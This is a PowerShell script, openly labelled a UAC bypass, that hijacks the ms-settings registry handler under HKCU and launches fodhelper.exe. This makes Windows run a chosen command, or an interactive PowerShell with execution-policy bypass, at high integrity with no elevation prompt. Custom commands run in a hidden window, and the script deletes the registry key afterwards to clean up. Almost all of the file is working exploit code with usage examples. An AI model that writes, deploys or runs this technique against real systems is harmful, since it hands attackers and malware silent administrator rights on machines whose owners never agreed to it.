<#
.SYNOPSIS
    PowerShell script to bypass UAC using fodhelper.exe by modifying registry keys.
    Executes a specified command or opens an elevated PowerShell session with execution policy bypass.

.DESCRIPTION
    This script modifies the HKCU:\Software\Classes\ms-settings registry key to
    execute a command or open an interactive PowerShell session via fodhelper.exe,
    which runs with high integrity level (bypassing UAC). The default behavior opens
    a PowerShell session with -ExecutionPolicy Bypass that remains open until manually closed.
    Registry cleanup occurs after the elevated session or command completes.
    Use with caution: This technique may be detected by security software.

.NOTES
    - Requires PowerShell to run.
    - Must be executed in a user context with registry write access.
    - Run in a test environment first, as this modifies the registry.

.PARAMETER Command
    The command to execute with elevated privileges. Defaults to opening an interactive
    PowerShell session with -ExecutionPolicy Bypass.

.EXAMPLE
    .\UACBypass.ps1
    # Opens an elevated PowerShell session with -ExecutionPolicy Bypass that stays open until manually closed.

.EXAMPLE
    .\UACBypass.ps1 -Command "powershell.exe -NoProfile -ExecutionPolicy Bypass"
    # Executes the specified command in a hidden elevated PowerShell session.
#>

param(
    [string]$Command = "powershell.exe -NoProfile -ExecutionPolicy Bypass"
)

# Function to check if the script is running with sufficient permissions
function Test-RegistryAccess {
    try {
        $testKey = "HKCU:\Software\Classes\_TestKey"
        New-Item -Path $testKey -Force -ErrorAction Stop | Out-Null
        Remove-Item -Path $testKey -Force -ErrorAction Stop
        return $true
    }
    catch {
        Write-Error "Insufficient permissions to modify registry. Run as a user with HKCU write access."
        return $false
    }
}

# Function to check if a process is running with elevated privileges
function Test-ElevatedProcess {
    try {
        $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object System.Security.Principal.WindowsPrincipal($token)
        return $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
    }
    catch {
        return $false
    }
}

# Main script
try {
    # Check registry access
    if (-not (Test-RegistryAccess)) {
        exit 1
    }

    # Determine the payload based on the provided command
    $Payload = if ($Command -eq "powershell.exe -NoProfile -ExecutionPolicy Bypass") {
        # Default case: Open interactive PowerShell with -ExecutionPolicy Bypass
        "powershell.exe -NoProfile -ExecutionPolicy Bypass"
    }
    else {
        # User-provided command: Run in a hidden window
        "powershell.exe -NoProfile -WindowStyle Hidden -Command `"$Command`""
    }

    # Setup registry for UAC bypass
    $regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
    Write-Host "Creating registry key: $regPath"
    New-Item -Path $regPath -Force -ErrorAction Stop | Out-Null

    # Set the command to execute
    Set-ItemProperty -Path $regPath -Name "(Default)" -Value $Payload -Force -ErrorAction Stop
    Set-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force -ErrorAction Stop

    # Trigger fodhelper.exe to execute the payload
    Write-Host "Launching fodhelper.exe to trigger elevation..."
    $fodhelperProcess = Start-Process "C:\Windows\System32\fodhelper.exe" -PassThru -ErrorAction Stop

    # Wait briefly for the process to start
    Start-Sleep -Milliseconds 500

    # Check if the payload process is running elevated (optional, for validation)
    Write-Host "Verifying elevation..."
    if (Test-ElevatedProcess) {
        Write-Host "Elevation successful (based on current context)."
    }
    else {
        Write-Warning "Elevation may not have succeeded. Check the session execution."
    }

    # Monitor the spawned PowerShell process for cleanup
    Write-Host "Waiting for elevated session or command to complete..."
    if ($Command -eq "powershell.exe -NoProfile -ExecutionPolicy Bypass") {
        # For default interactive session, find and wait for the PowerShell process
        $powershellProcess = Get-Process -Name "powershell" -ErrorAction SilentlyContinue | 
            Where-Object { $_.CommandLine -like "*$Payload*" -and $_.StartTime -ge $fodhelperProcess.StartTime }
        if ($powershellProcess) {
            Write-Host "Monitoring elevated PowerShell session (PID: $($powershellProcess.Id))..."
            $powershellProcess | Wait-Process -ErrorAction Stop
            Write-Host "Elevated PowerShell session closed."
        }
        else {
            Write-Warning "Could not find the elevated PowerShell process. Cleanup will proceed after a short delay."
            Start-Sleep -Seconds 2
        }
    }
    else {
        # For custom commands, assume quick completion and wait briefly
        Start-Sleep -Seconds 2
    }

    # Cleanup registry
    Write-Host "Cleaning up registry..."
    Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction Stop
    Write-Host "Cleanup complete."
}
catch {
    Write-Error "An error occurred: $_"
    exit 1
}
finally {
    # Ensure cleanup even if an error occurs
    if (Test-Path "HKCU:\Software\Classes\ms-settings") {
        try {
            Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
            Write-Host "Ensured registry cleanup in finally block."
        }
        catch {
            Write-Warning "Failed to clean up registry: $_"
        }
    }
}

Write-Host "Script completed."
